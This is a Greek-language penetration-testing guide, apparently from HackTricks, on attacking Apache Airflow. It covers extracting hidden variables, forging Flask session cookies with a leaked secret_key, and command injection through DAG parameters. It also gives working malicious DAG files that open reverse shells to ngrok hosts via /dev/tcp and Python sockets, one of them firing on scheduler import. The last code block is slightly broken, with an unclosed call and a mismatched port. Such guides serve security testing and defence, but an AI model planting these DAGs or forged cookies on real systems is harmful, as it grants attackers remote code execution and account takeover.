# Apache Airflow Security

{{#include ../../banners/hacktricks-training.md}}

### Basic Information

[**Apache Airflow**](https://airflow.apache.org) λειτουργεί ως πλατφόρμα για **τον προγραμματισμό και την εκτέλεση ροών δεδομένων ή εργασιών**. Ο όρος "ορχήστρωση" στο πλαίσιο των ροών δεδομένων σημαίνει τη διαδικασία οργάνωσης, συντονισμού και διαχείρισης σύνθετων ροών εργασίας δεδομένων που προέρχονται από διάφορες πηγές. Ο κύριος σκοπός αυτών των ορχηστρωμένων ροών δεδομένων είναι να παρέχουν επεξεργασμένα και καταναλώσιμα σύνολα δεδομένων. Αυτά τα σύνολα δεδομένων χρησιμοποιούνται εκτενώς από μια πληθώρα εφαρμογών, συμπεριλαμβανομένων αλλά όχι περιορισμένων σε εργαλεία επιχειρηματικής ευφυΐας, μοντέλα επιστήμης δεδομένων και μηχανικής μάθησης, τα οποία είναι θεμελιώδη για τη λειτουργία εφαρμογών μεγάλων δεδομένων.

Βασικά, το Apache Airflow θα σας επιτρέψει να **προγραμματίσετε την εκτέλεση κώδικα όταν κάτι** (γεγονός, cron) **συμβαίνει**.

### Local Lab

#### Docker-Compose

Μπορείτε να χρησιμοποιήσετε το **docker-compose config file από** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) για να εκκινήσετε ένα πλήρες περιβάλλον docker apache airflow. (Αν είστε σε MacOS, βεβαιωθείτε ότι δίνετε τουλάχιστον 6GB RAM στη VM docker).

#### Minikube

Ένας εύκολος τρόπος για να **τρέξετε το apache airflow** είναι να το τρέξετε **με το minikube**:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
### Ρύθμιση Airflow

Το Airflow μπορεί να αποθηκεύει **ευαίσθητες πληροφορίες** στη ρύθμισή του ή μπορεί να βρείτε αδύναμες ρυθμίσεις:

{{#ref}}
airflow-configuration.md
{{#endref}}

### RBAC Airflow

Πριν ξεκινήσετε να επιτίθεστε στο Airflow, θα πρέπει να κατανοήσετε **πώς λειτουργούν οι άδειες**:

{{#ref}}
airflow-rbac.md
{{#endref}}

### Επιθέσεις

#### Αριθμητική κονσόλας ιστού

Εάν έχετε **πρόσβαση στην κονσόλα ιστού**, μπορεί να μπορείτε να αποκτήσετε πρόσβαση σε ορισμένες ή όλες τις παρακάτω πληροφορίες:

- **Μεταβλητές** (Προσαρμοσμένες ευαίσθητες πληροφορίες μπορεί να αποθηκεύονται εδώ)
- **Συνδέσεις** (Προσαρμοσμένες ευαίσθητες πληροφορίες μπορεί να αποθηκεύονται εδώ)
- Πρόσβαση σε αυτές στο `http://<airflow>/connection/list/`
- [**Ρύθμιση**](./#airflow-configuration) (Ευαίσθητες πληροφορίες όπως το **`secret_key`** και κωδικοί πρόσβασης μπορεί να αποθηκεύονται εδώ)
- Λίστα **χρηστών & ρόλων**
- **Κώδικας κάθε DAG** (ο οποίος μπορεί να περιέχει ενδιαφέρουσες πληροφορίες)

#### Ανάκτηση Τιμών Μεταβλητών

Οι μεταβλητές μπορούν να αποθηκεύονται στο Airflow ώστε οι **DAGs** να μπορούν να **προσεγγίζουν** τις τιμές τους. Είναι παρόμοιο με τα μυστικά άλλων πλατφορμών. Εάν έχετε **αρκετές άδειες**, μπορείτε να τις αποκτήσετε μέσω της GUI στο `http://<airflow>/variable/list/`.\
Το Airflow από προεπιλογή θα δείξει την τιμή της μεταβλητής στη GUI, ωστόσο, σύμφωνα με [**αυτό**](https://marclamberti.com/blog/variables-with-apache-airflow/), είναι δυνατόν να ορίσετε μια **λίστα μεταβλητών** των οποίων η **τιμή** θα εμφανίζεται ως **αστερίσκοι** στη **GUI**.

![](<../../images/image (164).png>)

Ωστόσο, αυτές οι **τιμές** μπορούν να **ανακτηθούν** μέσω **CLI** (χρειάζεστε πρόσβαση στη βάση δεδομένων), **εκτέλεση αυθαίρετου DAG**, **API** που αποκτά πρόσβαση στο endpoint μεταβλητών (η API πρέπει να είναι ενεργοποιημένη), και **ακόμα και η ίδια η GUI!**\
Για να αποκτήσετε πρόσβαση σε αυτές τις τιμές από τη GUI, απλώς **επιλέξτε τις μεταβλητές** που θέλετε να αποκτήσετε πρόσβαση και **κάντε κλικ σε Ενέργειες -> Εξαγωγή**.\
Ένας άλλος τρόπος είναι να εκτελέσετε μια **bruteforce** στην **κρυφή τιμή** χρησιμοποιώντας το **φιλτράρισμα αναζήτησης** μέχρι να την αποκτήσετε:

![](<../../images/image (152).png>)

#### Κλιμάκωση Δικαιωμάτων

Εάν η ρύθμιση **`expose_config`** είναι ρυθμισμένη σε **True**, από το **ρόλο Χρήστη** και **πάνω** μπορούν να **διαβάσουν** τη **ρύθμιση στο διαδίκτυο**. Σε αυτή τη ρύθμιση, εμφανίζεται το **`secret_key`**, που σημαίνει ότι οποιοσδήποτε χρήστης με αυτό το έγκυρο μπορεί να **δημιουργήσει το δικό του υπογεγραμμένο cookie για να προσποιηθεί οποιονδήποτε άλλο λογαριασμό χρήστη**.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
#### DAG Backdoor (RCE in Airflow worker)

Αν έχετε **δικαιώματα εγγραφής** στον χώρο όπου αποθηκεύονται οι **DAGs**, μπορείτε απλά να **δημιουργήσετε έναν** που θα σας στείλει μια **reverse shell.**\
Σημειώστε ότι αυτή η reverse shell θα εκτελείται μέσα σε ένα **airflow worker container**:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
#### DAG Backdoor (RCE in Airflow scheduler)

Αν ορίσετε κάτι να **εκτελείται στη ρίζα του κώδικα**, τη στιγμή που γράφεται αυτό, θα **εκτελείται από τον προγραμματιστή** μετά από μερικά δευτερόλεπτα αφού το τοποθετήσετε μέσα στον φάκελο του DAG.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
#### Δημιουργία DAG

Αν καταφέρετε να **συμβιβάσετε μια μηχανή μέσα στο DAG cluster**, μπορείτε να δημιουργήσετε νέα **σενάρια DAG** στον φάκελο `dags/` και θα **αντιγραφούν στις υπόλοιπες μηχανές** μέσα στο DAG cluster.

#### Εισαγωγή Κώδικα DAG

Όταν εκτελείτε ένα DAG από το GUI μπορείτε να **περάσετε παραμέτρους** σε αυτό.\
Επομένως, αν το DAG δεν είναι σωστά κωδικοποιημένο, θα μπορούσε να είναι **ευάλωτο σε Command Injection.**\
Αυτό συνέβη σε αυτήν την CVE: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Όλα όσα χρειάζεται να γνωρίζετε για να **ξεκινήσετε να αναζητάτε command injections σε DAGs** είναι ότι οι **παράμετροι** **προσπελάζονται** με τον κώδικα **`dag_run.conf.get("param_name")`**.

Επιπλέον, η ίδια ευπάθεια μπορεί να συμβεί με **μεταβλητές** (σημειώστε ότι με αρκετά δικαιώματα θα μπορούσατε να **ελέγξετε την τιμή των μεταβλητών** στο GUI). Οι μεταβλητές **προσπελάζονται με**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
Αν χρησιμοποιούνται, για παράδειγμα, μέσα σε μια εντολή bash, θα μπορούσατε να εκτελέσετε μια ένεση εντολής.

{{#include ../../banners/hacktricks-training.md}}
